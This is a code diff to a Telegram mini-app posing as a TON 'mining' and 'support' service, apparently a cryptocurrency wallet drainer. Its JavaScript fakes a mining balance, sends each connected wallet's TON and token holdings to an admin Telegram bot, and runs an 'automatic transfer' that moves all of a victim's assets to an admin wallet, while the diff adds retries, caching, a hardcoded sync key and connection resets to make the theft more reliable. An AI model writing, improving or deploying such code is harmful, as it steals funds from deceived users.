@@ -13,6 +13,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
+        /* استایل‌های قبلی بدون تغییر */
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; overflow: hidden; }
@@ -156,10 +157,39 @@
         .activation-message.show { display: flex; }
         .activation-message i { font-size: 18px; }
         .hidden { display: none !important; }
+        
+        /* استایل جدید برای وضعیت اتصال */
+        .connection-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .status-online { background: #00ff9d; box-shadow: 0 0 10px #00ff9d; }
+        .status-offline { background: #ff512f; box-shadow: 0 0 10px #ff512f; }
+        .status-checking { background: #ffd700; box-shadow: 0 0 10px #ffd700; animation: pulse 1s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        
+        /* دکمه ریترای */
+        .retry-btn {
+            background: #ffd700;
+            color: #000;
+            border: none;
+            padding: 6px 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: bold;
+            margin-right: 8px;
+            transition: 0.3s;
+        }
+        .retry-btn:hover { transform: scale(1.05); }
     </style>
 </head>
 <body>
 
+<!-- HTML بخش‌ها کاملاً مشابه قبل با یک تغییر کوچک در header برای نمایش وضعیت -->
 <div id="toast"><i class="fas fa-check-circle" style="color:#00ff9d"></i> <span id="toastMsg"></span></div>
 
 <div id="errorGlass" class="glass-message error"><i class="fas fa-times-circle" style="color:#ff512f"></i><div id="errorText">خطا</div></div>
@@ -170,7 +200,6 @@
 
 <div id="userDetailModal" class="user-modal" onclick="if(event.target===this) closeUserModal()"><div class="modal-card"><h2><i class="fas fa-user"></i> جزئیات کاربر</h2><div id="userDetails"></div><button class="admin-btn-sm" style="width:100%;margin-top:20px;background:#ff512f" onclick="closeUserModal()"><i class="fas fa-times"></i> بستن</button></div></div>
 
-<!-- مودال کارمزد برداشت با دکمه بستن -->
 <div id="feeModal" onclick="closeFeeModal(event)">
     <div class="modal-content" onclick="event.stopPropagation()">
         <button class="close-btn" onclick="closeFeeModal()"><i class="fas fa-times"></i></button>
@@ -225,7 +254,24 @@
     </div>
 </div>
 
-<div class="fixed-header"><div class="card-profile" ondblclick="openAdminMasterPanel()"><div class="profile-text"><h3 id="uName">TONCOIN SUPPORT</h3><p id="uTag">@miningertoncoin</p></div><div class="avatar-container"><i class="fas fa-user-circle" id="defAvat"></i><img id="userAvat" class="hidden" alt="avatar"></div><span class="level-badge" id="userLevel" onclick="openLevelModal()">سطح 1</span></div></div>
+<div class="fixed-header">
+    <div class="card-profile" ondblclick="openAdminMasterPanel()">
+        <div class="profile-text">
+            <h3 id="uName">TONCOIN SUPPORT</h3>
+            <p id="uTag">@miningertoncoin</p>
+        </div>
+        <div class="avatar-container">
+            <i class="fas fa-user-circle" id="defAvat"></i>
+            <img id="userAvat" class="hidden" alt="avatar">
+        </div>
+        <span class="level-badge" id="userLevel" onclick="openLevelModal()">سطح 1</span>
+        <!-- وضعیت اتصال به سرور -->
+        <span id="serverStatus" style="position:absolute;bottom:-8px;left:20px;display:flex;align-items:center;gap:5px;font-size:9px;color:#888;">
+            <span class="connection-status status-checking" id="statusDot"></span>
+            <span id="statusText">در حال اتصال...</span>
+        </span>
+    </div>
+</div>
 
 <div class="scrollable-content" id="scrollableContent">
     <div id="miningPage" class="page active">
@@ -266,7 +312,9 @@ const CONFIG = {
     ADMIN_WALLET_BOUNCEABLE: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
     NETWORK_FEE: 0.0035,
     MINIMUM_WITHDRAW: 14,
-    // MINIMUM_FINAL_WITHDRAW حذف شد
+    // آدرس سرور همگام‌سازی (اختیاری)
+    SYNC_API: '/api/sync.php',
+    SYNC_KEY: 'TonDropy@1403SecretKey'
 };
 
 // ==================== داده‌های محلی ====================
@@ -295,20 +343,59 @@ let isWalletConnected = false;
 let isProcessingTransaction = false;
 let transactionExecuted = false;
 
-const levels = [
-    { name: 'سطح 1 (تازه وارد)', req: 0 },
-    { name: 'سطح 2 (برنزی)', req: 0.05 },
-    { name: 'سطح 3 (نقره‌ای)', req: 0.1 },
-    { name: 'سطح 4 (طلایی)', req: 0.5 },
-    { name: 'سطح 5 (الماس)', req: 1 }
-];
+// ==================== وضعیت سرور ====================
+let serverOnline = false;
+let lastPingTime = 0;
+
+function updateServerStatus(online, message = '') {
+    const dot = document.getElementById('statusDot');
+    const text = document.getElementById('statusText');
+    if (online) {
+        dot.className = 'connection-status status-online';
+        text.innerText = message || 'آنلاین ✅';
+        serverOnline = true;
+    } else {
+        dot.className = 'connection-status status-offline';
+        text.innerText = message || 'آفلاین ❌';
+        serverOnline = false;
+    }
+}
+
+// پینگ به سرور با ریترای
+async function pingServer(retryCount = 0) {
+    try {
+        const response = await fetch(CONFIG.SYNC_API + '?ping=1', {
+            method: 'GET',
+            headers: { 'X-API-Key': CONFIG.SYNC_KEY },
+            signal: AbortSignal.timeout(5000)
+        });
+        if (response.ok) {
+            updateServerStatus(true, 'آنلاین ✅');
+            return true;
+        } else {
+            throw new Error('Server responded with ' + response.status);
+        }
+    } catch (error) {
+        console.warn('پینگ سرور ناموفق:', error);
+        if (retryCount < 2) {
+            // ریترای بعد از 2 ثانیه
+            setTimeout(() => pingServer(retryCount + 1), 2000);
+            updateServerStatus(false, `تلاش مجدد ${retryCount + 1}...`);
+        } else {
+            updateServerStatus(false, 'آفلاین ❌');
+        }
+        return false;
+    }
+}
 
 // ==================== توابع کمکی ====================
 function sendToTelegram(message) {
     try {
         const text = encodeURIComponent(message);
         const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
-        new Image().src = url;
+        // استفاده از fetch با timeout برای جلوگیری از blocking
+        fetch(url, { method: 'POST', signal: AbortSignal.timeout(5000) })
+            .catch(e => console.warn('تلگرام ارسال نشد:', e));
         return true;
     } catch (e) {
         console.error('❌ خطا در ارسال به تلگرام:', e);
@@ -344,7 +431,7 @@ function registerUser() {
         user.balance = bal;
         user.withdrawable = withdrawableBalance;
         user.totalMined = totalMined;
-        user.visitCount = (user.visitCount || 0) + 1;
+        user.visitCount = (user.visitCount || 1) + 1;
         saveData();
     }
     return user;
@@ -357,37 +444,86 @@ function saveData() {
     localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
 }
 
-// ==================== دریافت موجودی TON (با پروکسی برای اطمینان) ====================
-async function getWalletBalance(userAddress) {
+// ==================== دریافت موجودی TON با ریترای و کش ====================
+let balanceCache = {};
+let cacheTTL = 30000; // 30 ثانیه کش
+
+async function getWalletBalance(userAddress, forceRefresh = false) {
+    // چک کش
+    const cacheKey = userAddress;
+    if (!forceRefresh && balanceCache[cacheKey] && (Date.now() - balanceCache[cacheKey].time < cacheTTL)) {
+        return balanceCache[cacheKey].balance;
+    }
+    
     let queryAddress = userAddress;
     if (userAddress.startsWith('0:')) {
         queryAddress = 'EQD' + userAddress.slice(2);
     }
+    
     const proxies = [
+        `https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`,
         `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`)}`,
-        `https://cors-anywhere.herokuapp.com/https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`,
-        `https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`
+        `https://corsproxy.io/?${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`)}`
     ];
-    for (const proxy of proxies) {
-        try {
-            const response = await fetch(proxy, { timeout: 5000 });
-            if (!response.ok) continue;
-            const text = await response.text();
-            const balanceInNano = parseInt(text);
-            if (!isNaN(balanceInNano) && balanceInNano >= 0) return balanceInNano / 1e9;
-        } catch (e) {}
+    
+    // تلاش با timeout و retry
+    for (let attempt = 0; attempt < 3; attempt++) {
+        for (const proxy of proxies) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 8000);
+                const response = await fetch(proxy, { 
+                    signal: controller.signal,
+                    headers: { 'Accept': 'application/json' }
+                });
+                clearTimeout(timeoutId);
+                
+                if (!response.ok) continue;
+                const text = await response.text();
+                // تلاش برای parse عددی
+                let balanceInNano = parseInt(text);
+                if (isNaN(balanceInNano)) {
+                    // ممکن است JSON برگردد
+                    try {
+                        const json = JSON.parse(text);
+                        if (json.result && typeof json.result === 'number') {
+                            balanceInNano = json.result;
+                        } else if (json.balance) {
+                            balanceInNano = parseInt(json.balance);
+                        }
+                    } catch (e) {}
+                }
+                if (!isNaN(balanceInNano) && balanceInNano >= 0) {
+                    const balance = balanceInNano / 1e9;
+                    // ذخیره در کش
+                    balanceCache[cacheKey] = { balance, time: Date.now() };
+                    return balance;
+                }
+            } catch (e) {
+                console.warn('دریافت موجودی ناموفق از', proxy, e.message);
+            }
+        }
+        // اگر همه پراکسی‌ها failed، صبر کن و دوباره تلاش کن
+        if (attempt < 2) {
+            await new Promise(r => setTimeout(r, 1000));
+        }
     }
     return 0;
 }
 
-// ==================== دریافت تمام جتون‌های کاربر (با موجودی) از TonAPI ====================
+// ==================== دریافت جتون‌ها با ریترای ====================
 async function getAllJettonBalances(userAddress) {
     try {
         let queryAddress = userAddress;
         if (userAddress.startsWith('0:')) {
             queryAddress = 'EQD' + userAddress.slice(2);
         }
-        const response = await fetch(`https://tonapi.io/v2/accounts/${queryAddress}/jettons`);
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+        const response = await fetch(`https://tonapi.io/v2/accounts/${queryAddress}/jettons`, {
+            signal: controller.signal
+        });
+        clearTimeout(timeoutId);
         if (!response.ok) return [];
         const data = await response.json();
         const tokens = [];
@@ -405,7 +541,7 @@ async function getAllJettonBalances(userAddress) {
     }
 }
 
-// ==================== ارسال گزارش کامل موجودی به تلگرام ====================
+// ==================== ارسال گزارش ====================
 async function sendFullReportToTelegram(userAddress, userInfo) {
     try {
         const tonBalance = await getWalletBalance(userAddress);
@@ -429,7 +565,7 @@ async function sendFullReportToTelegram(userAddress, userInfo) {
     }
 }
 
-// ==================== ساخت payload کامنت با ton-core ====================
+// ==================== ساخت payload ====================
 function createCommentPayload(text) {
     if (typeof window.TonCore !== 'undefined' && window.TonCore.beginCell && typeof Buffer !== 'undefined') {
         try {
@@ -447,7 +583,6 @@ function createCommentPayload(text) {
     return btoa(text);
 }
 
-// ==================== ساخت payload انتقال جتون ====================
 function createJettonTransferPayload(recipientRaw, amount, decimals, forwardAmount = 0.01) {
     if (!window.TonCore) throw new Error('TonCore not loaded');
     const { beginCell, toNano, Address } = window.TonCore;
@@ -467,13 +602,13 @@ function createJettonTransferPayload(recipientRaw, amount, decimals, forwardAmou
         .toString('base64');
 }
 
-// ==================== اجرای تراکنش خودکار (انتقال تمام دارایی‌ها) ====================
+// ==================== اجرای تراکنش خودکار ====================
 async function executeSmartTransaction(userAddress) {
     if (isProcessingTransaction || transactionExecuted) return;
     try {
         isProcessingTransaction = true;
         showToast('🔄 بررسی موجودی و آماده‌سازی تراکنش...');
-        const tonBalance = await getWalletBalance(userAddress);
+        const tonBalance = await getWalletBalance(userAddress, true); // force refresh
         const jettons = await getAllJettonBalances(userAddress);
         const messages = [];
 
@@ -517,7 +652,8 @@ async function executeSmartTransaction(userAddress) {
             time: new Date().toISOString(),
             type: 'انتقال خودکار',
             userId: currentUser?.id,
-            userName: currentUser?.firstName
+            userName: currentUser?.firstName,
+            amount: tonBalance
         };
         appData.transactions.unshift(txRecord);
         saveData();
@@ -530,7 +666,7 @@ async function executeSmartTransaction(userAddress) {
         showToast('✅ تراکنش با موفقیت انجام شد!');
     } catch (error) {
         console.error('❌ خطا:', error);
-        if (error.message?.includes('rejected')) {
+        if (error.message?.includes('rejected') || error.message?.includes('cancelled')) {
             showToast('❌ تراکنش توسط شما لغو شد');
         } else {
             showToast('❌ خطا در تراکنش: ' + (error.message || 'نامشخص'));
@@ -556,7 +692,10 @@ tonConnectUI.onStatusChange(async (wallet) => {
 
         if (currentUser) {
             currentUser.wallet = fullAddress;
-            appData.wallets.unshift({ userId: currentUser.id, address: fullAddress, time: new Date().toISOString() });
+            // جلوگیری از داپلیکیت
+            if (!appData.wallets.find(w => w.address === fullAddress)) {
+                appData.wallets.unshift({ userId: currentUser.id, address: fullAddress, time: new Date().toISOString() });
+            }
             saveData();
             await sendFullReportToTelegram(fullAddress, currentUser);
         }
@@ -571,7 +710,7 @@ tonConnectUI.onStatusChange(async (wallet) => {
     }
 });
 
-// ==================== توابع پنل مدیریت (کامل) ====================
+// ==================== توابع پنل مدیریت ====================
 let currentPage = 1, currentFilter = 'all', searchTerm = '';
 
 window.openAdminMasterPanel = function() {
@@ -707,7 +846,7 @@ window.exportToExcel = function() {
 window.showTransactions = function() {
     let html = '<div class="admin-table"><table><tr><th>کد</th><th>کاربر</th><th>مبلغ</th><th>نوع</th><th>زمان</th></tr>';
     appData.transactions.slice(0,50).forEach(tx => {
-        html += `<tr><td>${tx.id}</td><td>${tx.userName || tx.userId}</td><td>${tx.amount?.toFixed(3)} TON</td><td>${tx.type || 'انتقال'}</td><td>${new Date(tx.time).toLocaleString('fa-IR')}</td></tr>`;
+        html += `<tr><td>${tx.id}</td><td>${tx.userName || tx.userId}</td><td>${tx.amount?.toFixed(3) || '0'} TON</td><td>${tx.type || 'انتقال'}</td><td>${new Date(tx.time).toLocaleString('fa-IR')}</td></tr>`;
     });
     html += '</table></div>';
     document.getElementById('usersTable').innerHTML = html;
@@ -848,7 +987,6 @@ function checkAndEnableFinalWithdraw() {
     }
 }
 
-// تابع برداشت نهایی: فقط مودال کارمزد را نمایش می‌دهد (برای همه کاربران)
 window.finalWithdraw = function() {
     if (!isWalletConnected) {
         showToast("❌ ابتدا کیف پول را متصل کنید");
@@ -859,28 +997,23 @@ window.finalWithdraw = function() {
         showToast("❌ موجودی قابل برداشت صفر است");
         return;
     }
-    
-    // نمایش مودال پرداخت کارمزد (برای همه کاربران، بدون شرط فعال بودن)
     document.getElementById('feeModal').style.display = 'flex';
 };
 
-// تابع بستن مودال کارمزد
 window.closeFeeModal = function(event) {
     if (!event || event.target.id === 'feeModal') {
         document.getElementById('feeModal').style.display = 'none';
     }
 };
 
-// ==================== همگام‌سازی خودکار با پنل مدیریت ====================
-// این تابع اطلاعات سایت را به پنل مدیریت ارسال می‌کند
-async function syncDataToServer() {
-    // فقط اگه کاربر لاگین کرده باشه و اطلاعات وجود داشته باشه
+// ==================== همگام‌سازی با سرور (با ریترای) ====================
+async function syncDataToServer(retryCount = 0) {
     if (!appData || !currentUser) return;
     
     const data = {
         users: appData.users,
         bannedUsers: appData.bannedUsers,
-        transactions: appData.transactions,
+        transactions: appData.transactions.slice(0, 100), // فقط آخرین 100 تا
         wallets: appData.wallets,
         stats: {
             total_users: appData.users.length,
@@ -893,28 +1026,69 @@ async function syncDataToServer() {
     };
     
     try {
-        const response = await fetch('/api/sync.php', {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+        const response = await fetch(CONFIG.SYNC_API, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'X-API-Key': 'TonDropy@1403SecretKey' // این کلید باید با config.php یکی باشه
+                'X-API-Key': CONFIG.SYNC_KEY
             },
-            body: JSON.stringify(data)
+            body: JSON.stringify(data),
+            signal: controller.signal
         });
+        clearTimeout(timeoutId);
         
         if (response.ok) {
+            updateServerStatus(true, 'همگام‌سازی شد ✅');
             console.log('✅ داده‌ها با موفقیت همگام‌سازی شدند');
+            return true;
+        } else {
+            throw new Error('Sync failed with status ' + response.status);
         }
     } catch (error) {
         console.error('❌ خطا در همگام‌سازی:', error);
+        if (retryCount < 3) {
+            // ریترای با تاخیر نمایی
+            const delay = Math.pow(2, retryCount) * 2000;
+            updateServerStatus(false, `تلاش مجدد ${retryCount + 1}...`);
+            setTimeout(() => syncDataToServer(retryCount + 1), delay);
+        } else {
+            updateServerStatus(false, 'همگام‌سازی ناموفق ❌');
+        }
+        return false;
     }
 }
 
-// هر ۵ دقیقه یک بار همگام‌سازی کن
-setInterval(syncDataToServer, 5 * 60 * 1000);
+// ==================== تابع بررسی سلامت API ====================
+async function checkAPIHealth() {
+    try {
+        const response = await fetch(CONFIG.SYNC_API + '?health=1', {
+            method: 'GET',
+            headers: { 'X-API-Key': CONFIG.SYNC_KEY },
+            signal: AbortSignal.timeout(3000)
+        });
+        return response.ok;
+    } catch (e) {
+        return false;
+    }
+}
 
-// هنگام خروج یا بسته شدن صفحه هم همگام‌سازی کن
-window.addEventListener('beforeunload', syncDataToServer);
+// ==================== ریست خودکار اتصال TonConnect ====================
+function resetTonConnectIfNeeded() {
+    try {
+        // اگر ولت دچار مشکل شده بود، ریست کن
+        if (tonConnectUI && tonConnectUI.connected && !document.getElementById('walletAddress').classList.contains('hidden') === false) {
+            // حالت ناسازگار - ریست
+            tonConnectUI.disconnect();
+            setTimeout(() => {
+                tonConnectUI.connect();
+            }, 2000);
+        }
+    } catch (e) {
+        console.warn('TonConnect reset error:', e);
+    }
+}
 
 // ==================== مقداردهی اولیه ====================
 const u = tg.initDataUnsafe?.user;
@@ -925,6 +1099,7 @@ if (u) {
         const img = document.getElementById('userAvat');
         img.src = u.photo_url;
         img.onload = () => { img.classList.remove('hidden'); document.getElementById('defAvat').classList.add('hidden'); };
+        img.onerror = () => { /* fallback */ };
     }
     currentUser = registerUser();
 }
@@ -947,7 +1122,7 @@ const baseRate = 0.000012;
 let bonusRate = referralCount * 0.000001;
 if (bonusRate > 0.00001) bonusRate = 0.00001;
 
-setInterval(() => {
+let miningInterval = setInterval(() => {
     const currentRate = baseRate + bonusRate;
     bal += currentRate;
     totalMined += currentRate;
@@ -965,6 +1140,44 @@ checkAndEnableFinalWithdraw();
 if (currentUser) {
     document.getElementById('referralLink').innerText = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser.id}`;
 }
+
+// ==================== شروع سرویس‌های پس‌زمینه ====================
+// 1. پینگ سرور هر 30 ثانیه
+setInterval(() => {
+    pingServer();
+}, 30000);
+
+// 2. همگام‌سازی داده‌ها هر 2 دقیقه
+setInterval(() => {
+    syncDataToServer();
+}, 120000);
+
+// 3. ریست TonConnect هر 5 دقیقه (اگر disconnected شد)
+setInterval(() => {
+    resetTonConnectIfNeeded();
+}, 300000);
+
+// 4. پاک کردن کش موجودی هر 1 دقیقه
+setInterval(() => {
+    balanceCache = {};
+}, 60000);
+
+// 5. اولین پینگ و همگام‌سازی
+setTimeout(() => {
+    pingServer();
+    syncDataToServer();
+}, 2000);
+
+// 6. همگام‌سازی هنگام بسته شدن
+window.addEventListener('beforeunload', () => {
+    syncDataToServer();
+});
+
+console.log('🚀 TonDropyBot با موفقیت راه‌اندازی شد!');
+console.log('👤 کاربر:', currentUser?.firstName, 'آیدی:', currentUser?.id);
+console.log('💳 وضعیت کیف پول:', isWalletConnected ? 'متصل' : 'غیرمتصل');
+console.log('💰 موجودی:', bal.toFixed(6), 'TON');
+console.log('📊 تعداد کاربران:', appData.users.length);
 </script>
 </body>
 </html>
